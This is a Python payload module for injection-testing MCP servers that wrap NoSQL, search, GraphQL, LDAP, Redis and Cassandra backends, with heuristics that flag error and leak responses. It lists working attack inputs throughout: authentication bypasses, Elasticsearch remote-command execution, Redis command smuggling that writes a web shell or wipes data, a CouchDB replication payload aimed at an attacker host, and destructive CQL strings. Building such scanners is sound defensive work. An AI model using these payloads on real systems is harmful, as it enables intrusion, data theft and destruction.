"""NoSQL / GraphQL / LDAP injection payloads for R5 (input validation)
and R1 (unauthorised data access).

MCP servers that wrap document stores, search engines, or graph APIs
often accept user-supplied filters and forward them to the backend with
little or no normalisation. This is a textbook NoSQL-injection surface:
operator smuggling, query-shape confusion, and authentication bypass.

Payload categories:

* ``mongo_operators``     — ``$ne``, ``$gt``, ``$where``, ``$regex``, ``$expr``
* ``mongo_auth_bypass``   — login-form classics ported to MongoDB
* ``mongo_blind``         — JS-side ``sleep`` / loop-based timing oracles
* ``couchdb``             — Mango selectors and view-key abuse
* ``elasticsearch``       — script-query and Painless RCE shapes
* ``graphql``             — introspection, batch, alias, depth attacks
* ``ldap``                — wildcard / null-byte / boolean-bypass strings
* ``redis``               — protocol-injection and CONFIG SET attacks
* ``cassandra``           — CQL injection-style strings
* ``sql_like_nosql``      — operator strings that look harmless to a SQL
                            sanitiser but are dangerous to a NoSQL backend
"""

from __future__ import annotations

from typing import Any

# ---------------------------------------------------------------------------
# MongoDB / Mongoose operator smuggling
# ---------------------------------------------------------------------------

MONGO_OPERATORS: list[Any] = [
    # Always-true via $ne — the canonical NoSQLi.
    {"$ne": None},
    {"$ne": ""},
    {"$ne": 1},
    {"$gt": ""},
    {"$gte": ""},
    {"$lt": "\uffff"},
    {"$lte": "\uffff"},
    {"$exists": True},
    {"$exists": False},
    # $in with wildcard-ish list.
    {"$in": ["", None, 0, False, "admin", "root"]},
    {"$nin": []},
    # Regex match-all.
    {"$regex": ".*"},
    {"$regex": "^a"},
    {"$regex": ".*", "$options": "is"},
    # Server-side JS evaluation.
    {"$where": "1==1"},
    {"$where": "this.password.length > 0"},
    {"$where": "sleep(5000) || true"},
    {"$where": "function(){return true}"},
    # $expr — operator that lets you reference fields on both sides.
    {"$expr": {"$eq": [1, 1]}},
    {"$expr": {"$gt": [{"$strLenCP": "$password"}, 0]}},
    # $function (Mongo 4.4+) — JS execution path.
    {"$function": {"body": "function(){return true}", "args": [], "lang": "js"}},
    # $accumulator — similar JS path on aggregation.
    {"$accumulator": {"init": "function(){return 0}", "accumulate": "function(){return 1}", "lang": "js"}},
    # JSON-Path-style smuggling (some ORMs accept).
    {"$jsonSchema": {"required": ["x"]}},
    # Type juggling — match anything via type filter.
    {"$type": "string"},
    {"$type": 2},
    # NULL / undefined string forms.
    "true, $where: '1==1'",
    {"username": {"$ne": None}, "password": {"$ne": None}},
]

# ---------------------------------------------------------------------------
# MongoDB auth-bypass classics (often delivered as JSON request bodies)
# ---------------------------------------------------------------------------

MONGO_AUTH_BYPASS: list[Any] = [
    {"username": {"$ne": "x"}, "password": {"$ne": "x"}},
    {"username": "admin", "password": {"$ne": "x"}},
    {"username": "admin", "password": {"$gt": ""}},
    {"username": "admin", "password": {"$regex": ".*"}},
    {"username": {"$in": ["admin", "root"]}, "password": {"$ne": "x"}},
    {"username": {"$gt": ""}, "password": {"$gt": ""}},
    {"username": "admin'||'1'=='1", "password": "x"},
    # URL-style forms (when the server serialises into the query).
    "username[$ne]=x&password[$ne]=x",
    "username=admin&password[$ne]=x",
    "username[$regex]=^adm&password[$regex]=.*",
]

# ---------------------------------------------------------------------------
# MongoDB blind / timing oracles
# ---------------------------------------------------------------------------

MONGO_BLIND: list[Any] = [
    # JS sleep — exfil via response latency.
    {"$where": "sleep(5000) || true"},
    {"$where": "function(){var d=new Date();var s=d.getTime();while(new Date().getTime()-s<5000);return true}"},
    # Char-by-char password extraction shape.
    {"$where": "this.password && this.password.match(/^a/)"},
    {"username": "admin", "password": {"$regex": "^a"}},
    {"username": "admin", "password": {"$regex": "^.{20,}$"}},
    # Boolean oracle — true vs false branches give detectable diff.
    {"$where": "this.username == 'admin' && this.password.length > 10"},
]

# ---------------------------------------------------------------------------
# CouchDB / Cloudant — Mango selectors
# ---------------------------------------------------------------------------

COUCHDB: list[Any] = [
    {"selector": {"_id": {"$gt": None}}},
    {"selector": {"$or": [{"_id": {"$gt": None}}, {"_id": {"$lte": "\uffff"}}]}},
    # Index-explosion DOS.
    {"selector": {"$and": [{"a": {"$gt": 0}}] * 100}},
    # View-key abuse (HTTP query string variants).
    "_all_docs?include_docs=true",
    "_design/x/_view/y?startkey=%22%22&endkey=%22%5Cuffff%22",
    # Replication target hijack.
    {"source": "http://attacker.example/db", "target": "http://127.0.0.1:5984/_users", "create_target": True},
]

# ---------------------------------------------------------------------------
# Elasticsearch / OpenSearch — script-query / Painless / wildcard
# ---------------------------------------------------------------------------

ELASTICSEARCH: list[Any] = [
    {"query": {"match_all": {}}},
    {"query": {"wildcard": {"_id": "*"}}},
    {"query": {"query_string": {"query": "*"}}},
    {"query": {"query_string": {"query": "*:*"}}},
    # Script-score / inline scripting (Painless RCE class when "inline" allowed).
    {
        "script_score": {
            "script": {
                "source": "java.lang.Runtime.getRuntime().exec('id')",
                "lang": "painless",
            }
        }
    },
    {
        "script_fields": {
            "x": {
                "script": {
                    "source": "Runtime.getRuntime().exec('id')",
                    "lang": "painless",
                }
            }
        }
    },
    # MVEL legacy script (older ES).
    {"script": "java.lang.Runtime.getRuntime().exec(\"id\")"},
    # Aggregation-time DoS.
    {"size": 0, "aggs": {"a": {"cardinality": {"field": "_id", "precision_threshold": 40000}}}},
    # Index template clobber.
    {"index_patterns": ["*"], "template": {"settings": {"number_of_shards": 1000}}},
    # Search-template injection.
    {"id": "../../../../etc/passwd"},
]

# ---------------------------------------------------------------------------
# GraphQL — introspection, batching, alias amplification, depth attacks
# ---------------------------------------------------------------------------

GRAPHQL: list[str] = [
    # Introspection probe — should be off in prod.
    '{"query":"{__schema{types{name}}}"}',
    '{"query":"{__type(name:\\"User\\"){fields{name}}}"}',
    # Field suggestion oracle (pre-2018 graphql-js leaks via error suggestions).
    '{"query":"{ usr { id } }"}',
    # Alias amplification — single request executes a field N times.
    '{"query":"{ a:user(id:1){password} b:user(id:1){password} c:user(id:1){password} }"}',
    # Batch query DoS.
    '[{"query":"{user(id:1){id}}"},{"query":"{user(id:2){id}}"},{"query":"{user(id:3){id}}"}]',
    # Deep nesting — circular relationship abuse.
    '{"query":"{ user { friends { friends { friends { friends { id } } } } } }"}',
    # Mutation that should require auth.
    '{"query":"mutation{deleteUser(id:1){id}}"}',
    # Operation-name confusion — prevents WAF rule on field name.
    '{"query":"query x { user(id:1){password} }"}',
    # Variable smuggling.
    '{"query":"query($id:ID!){user(id:$id){password}}","variables":{"id":"1\' OR 1=1 --"}}',
    # GET-style introspection (some servers accept).
    "?query={__schema{types{name}}}",
    # Directive abuse (stream / defer DoS).
    '{"query":"{ user(id:1) { ...F @stream(initialCount:0) } } fragment F on User { id name }"}',
]

# ---------------------------------------------------------------------------
# LDAP injection
# ---------------------------------------------------------------------------

LDAP: list[str] = [
    # Authentication bypass — universal-true filter.
    "*",
    "*)(uid=*",
    "*)(uid=*))(|(uid=*",
    "*))%00",
    "admin)(&(password=*))",
    "admin)(|(password=*",
    "admin*",
    # Boolean-true via attribute presence.
    "*)(objectClass=*)",
    "*)(cn=*)",
    # Filter-syntax breakage.
    ")(",
    "()",
    "(",
    # Charset / encoding bypass.
    "\\2a",          # encoded *
    "\\28",          # encoded (
    "\\29",          # encoded )
    # DN smuggling.
    "cn=admin,dc=evil,dc=example",
    # Password-attribute brute-force shape.
    "*)(userPassword=*)",
]

# ---------------------------------------------------------------------------
# Redis protocol-injection (when the server interpolates user input
# into a Redis command line — e.g. Lua scripting wrappers)
# ---------------------------------------------------------------------------

REDIS: list[str] = [
    # CRLF — chains a second Redis command after the intended one.
    "key\r\nFLUSHALL\r\n",
    "key\r\nCONFIG SET dir /var/www/html\r\n",
    "key\r\nCONFIG SET dbfilename shell.php\r\n",
    "key\r\nSET pwn 1\r\n",
    "key\r\nSAVE\r\n",
    "key\r\nDEBUG SLEEP 5\r\n",
    "key\r\nSHUTDOWN NOSAVE\r\n",
    # Cluster-bus protocol confusion.
    "*1\r\n$4\r\nPING\r\n",
    # Lua sandbox escape-style strings (older Redis EVAL).
    "redis.call('FLUSHALL')",
    # Module load (newer Redis).
    "MODULE LOAD /tmp/evil.so",
]

# ---------------------------------------------------------------------------
# Cassandra / CQL (technically SQL-like but wrappers often misclassify)
# ---------------------------------------------------------------------------

CASSANDRA: list[str] = [
    "' OR token(id) > token(0) ALLOW FILTERING --",
    "'; DROP KEYSPACE x --",
    "'; TRUNCATE users --",
    "' AND id IN (SELECT id FROM users) ALLOW FILTERING --",
    # USING TIMESTAMP attack on quorum writes.
    "'; INSERT INTO users(id,role) VALUES(1,'admin') USING TIMESTAMP 9999999999999 --",
]

# ---------------------------------------------------------------------------
# Generic operator strings that look harmless to a SQL-only sanitiser
# ---------------------------------------------------------------------------

SQL_LIKE_NOSQL: list[str] = [
    "[$ne]",
    "[$gt]",
    "[$regex]",
    "[$where]",
    # Express / qs deep-object form: ?user[$ne]=x.
    "user[$ne]=x",
    "user[$where]=1",
    "user[$regex]=.*",
    # Prototype-pollution sigil that backends sometimes pass to Mongo.
    "__proto__[admin]=true",
    "constructor[prototype][admin]=true",
]


PAYLOADS: dict[str, list[Any]] = {
    "mongo_operators": MONGO_OPERATORS,
    "mongo_auth_bypass": MONGO_AUTH_BYPASS,
    "mongo_blind": MONGO_BLIND,
    "couchdb": COUCHDB,
    "elasticsearch": ELASTICSEARCH,
    "graphql": GRAPHQL,
    "ldap": LDAP,
    "redis": REDIS,
    "cassandra": CASSANDRA,
    "sql_like_nosql": SQL_LIKE_NOSQL,
}


def generate_nosql_payloads() -> list[tuple[str, Any]]:
    """Yield ``(category, value)`` tuples for all NoSQL-injection payloads."""
    out: list[tuple[str, Any]] = []
    for category, values in PAYLOADS.items():
        for v in values:
            out.append(("nosql_" + category, v))
    return out


# ---------------------------------------------------------------------------
# Response-side indicators
# ---------------------------------------------------------------------------

NOSQL_ERROR_INDICATORS: list[str] = [
    # MongoDB / Mongoose
    "mongoerror",
    "mongoexception",
    "mongoose",
    "bsontypeerror",
    "$where",
    "operator $",
    "unknown top level operator",
    "cannot use $",
    "cast to objectid failed",
    "objectparameter",
    # CouchDB
    "couchdb",
    "_design",
    "ejsonerror",
    # Elasticsearch / OpenSearch
    "elasticsearchexception",
    "search_phase_execution_exception",
    "json_parse_exception",
    "parse_exception",
    "query_shard_exception",
    "x-content-type-options: nosniff",
    "painless",
    "compile error",
    # GraphQL
    "graphqlerror",
    "syntax error",
    "cannot query field",
    "did you mean",
    "field \"",
    "validationerror",
    # LDAP
    "ldap_search",
    "javax.naming.directory",
    "ldap: result code",
    "no such object",
    "invalid dn syntax",
    # Redis
    "wrongtype",
    "noauth",
    "loading",
    "readonly",
    "moved ",
    "ask ",
    # Cassandra
    "syntaxexception",
    "invalidrequestexception",
    "unconfigured table",
]

NOSQL_LEAK_INDICATORS: list[str] = [
    # Document-shape leaks suggesting unbounded query.
    '"_id"',
    '"_rev"',
    '"_source"',
    '"hits":',
    '"total":',
    # Auth-bypass success markers.
    '"role":"admin"',
    '"isAdmin":true',
    '"is_admin":true',
    '"superuser":true',
    # GraphQL introspection success.
    '"__schema"',
    '"__type"',
    '"types":[',
    # Painless / script result.
    '"script_stack"',
    '"caused_by"',
]


def looks_like_nosql_error(response_text: str) -> bool:
    """Heuristic: did the response leak NoSQL-backend internals?"""
    lower = response_text.lower()
    return any(ind in lower for ind in NOSQL_ERROR_INDICATORS)


def looks_like_nosql_leak(response_text: str) -> bool:
    """Heuristic: does the response look like an over-broad query result?"""
    return any(ind in response_text for ind in NOSQL_LEAK_INDICATORS)
